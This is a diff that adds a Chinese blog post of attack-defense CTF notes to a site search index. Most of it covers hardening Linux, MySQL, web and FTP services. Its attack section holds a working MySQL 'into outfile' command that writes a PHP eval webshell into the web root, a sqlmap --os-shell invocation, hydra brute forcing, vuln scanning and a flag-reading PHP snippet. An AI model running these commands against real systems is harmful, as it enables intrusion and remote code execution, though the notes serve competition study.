@@ -3247,4 +3247,149 @@ echo "Line #{$line_num} : ",$line,'<br />';}
         <category>HW</category>
       </categories>
   </entry>
+  <entry>
+    <title>AWD攻防</title>
+    <url>/2021/04/05/AWD%E6%94%BB%E9%98%B2/</url>
+    <content><![CDATA[<h2 id="linux加固思路"><a href="#linux加固思路" class="headerlink" title="linux加固思路"></a>linux加固思路</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><ul>
+<li><p>awk -F: ‘/bash$/{print $1}’ /etc/passwd    看不是nologin的用户</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5scnq89tj30fd02x3yo.jpg" alt="image-20191222204439238"></p>
+<ul>
+<li><p>删除用户，改密码</p>
+<ul>
+<li><p>echo 用户名:密码 | chpasswd</p>
+</li>
+<li><p>锁定用户  passwd -l 用户名  (-u 解锁)</p>
+</li>
+<li><p>/etc/hosts.allow   添加sshd:ip    限制登陆ip</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5si6op3oj30ga0dmwgh.jpg" alt="image-20191222205000466"></p>
+</li>
+<li><p>/etc/hosts.deny    添加sshd:ALL    拒绝所有ip连接，先设置deny，在设置allow</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5siw0qdhj30ff08omy8.jpg" alt="image-20191222205040511"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ps -ef | grep 服务名    查看系统进程</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5sjxy7t8j30fp09w3zo.jpg" alt="image-20191222205141209"></p>
+<ul>
+<li><p>netstat -tunlp      查看系统进程</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5sksoxu3j30ix06owfw.jpg" alt="image-20191222205231220"></p>
+<ul>
+<li>kill -9 pid         强制杀进程</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>注意查看./文件，</p>
+</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5slqy5h6j30fy024dg3.jpg" alt="image-20191222205325439"></p>
+<ul>
+<li>开机自启动服务   /etc/rc.local</li>
+</ul>
+<h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a>数据库加固</h3><ul>
+<li>mysql -u root -h127.0.0.1 -p    登陆数据库<ul>
+<li>select * from users;    查看所有用户<ul>
+<li>看表中host值为%，删除    delete from user where user=’root’ and host=’%’;</li>
+<li>set password for ‘用户‘@’地址’=password(‘新密码’);</li>
+<li>flush privileges;     service mysql restart   保存、重启数据库</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="web加固"><a href="#web加固" class="headerlink" title="web加固"></a>web加固</h3><ul>
+<li><p>备份网站文件</p>
+</li>
+<li><p>find ./ -name ‘*.php’ | xargs grep -n ‘eval’    查找文件中关键函数</p>
+</li>
+<li><p>import os</p>
+<p>import time</p>
+<p>while 1:</p>
+<p>​    os.system(‘rm -rf /tmp/*’)</p>
+<p>​    time.sleep(1)</p>
+<p>删除文件上传目录下的文件，不允许文件存在</p>
+</li>
+<li><p>修改函数加固，限制上传文件</p>
+</li>
+<li><p>网站目录权限    chmod -R 000 /var/www/html</p>
+</li>
+</ul>
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><ul>
+<li><p>/etc/vsftpd.conf</p>
+<ul>
+<li><p>chroot_local_user=YES      将用户限制在主目录</p>
+</li>
+<li><p>local_root=/media/ftp/pub   本地用户主目录</p>
+</li>
+<li><p>anonymous_enable=NO    匿名用户</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul>
+<li>/var/log/apache2/access.log        日志利用</li>
+</ul>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li><p>信息收集</p>
+<ul>
+<li>nmap -T4 -sS -O -sV -A –script=vuln 172.16.1.0/24</li>
+<li>curl <a href="http://10.10.10.1/post/post.php" target="_blank" rel="noopener">http://10.10.10.1/post/post.php</a> -d “flag=123456&amp;IP=X.X.X.X”    提交方式（参考）</li>
+</ul>
+</li>
+<li><p>爆破</p>
+<ul>
+<li><p>hydra -L 用户名字典 -P 密码字典    mysql://IP地址 -v</p>
+</li>
+<li><p>弱密码登陆 root、server、admin、user。。。。。。。</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5u7z1luuj30lx04qjru.jpg" alt="image-20191222214922135"></p>
+</li>
+</ul>
+</li>
+<li><p>系统漏洞</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5u8jmozqj30jc095wfu.jpg" alt="image-20191222214955725"></p>
+</li>
+</ul>
+<ul>
+<li><p>ftp</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5uapqm5ej30fi0eu43n.jpg" alt="image-20191222215201358"></p>
+</li>
+</ul>
+<ul>
+<li><p>查找后门</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5ublzc7tj30un0fm40z.jpg" alt="image-20191222215253199"></p>
+</li>
+</ul>
+<ul>
+<li><p>绕过</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5uce0nmoj30i003w74g.jpg" alt="image-20191222215338142"></p>
+</li>
+</ul>
+<ul>
+<li><p>phpmyadmin</p>
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga5uctvn9xj30p409njst.jpg" alt="image-20191222215403086"></p>
+</li>
+</ul>
+<h4 id="mysql数据库利用"><a href="#mysql数据库利用" class="headerlink" title="mysql数据库利用"></a>mysql数据库利用</h4><ul>
+<li>sqlmap -d’mysql://账号:密码@IP地址:3306/mysql’ –os-shell                返回一个shell</li>
+<li>select “<?php @eval($_POST['alin']);?>” into outfile “/var/www/html/alin.php”;</li>
+</ul>
+<h3 id="web利用"><a href="#web利用" class="headerlink" title="web利用"></a>web利用</h3><p>php://input       data:text/plain;          都可用这个语句读flag</p>
+<?php
+$lines=file('/root/flaginfo.txt');foreach($lines as $line_num => $line){
+echo "Line #{$line_num} : ",$line,'<br />';}
+?>
+
+
+
+
+
+<p>/var/log/secure # 与安全相关的日志信息       系统日志</p>
+<p>/var/log/apache/access.log            网站日志</p>
+]]></content>
+      <categories>
+        <category>HW</category>
+      </categories>
+  </entry>
 </search>
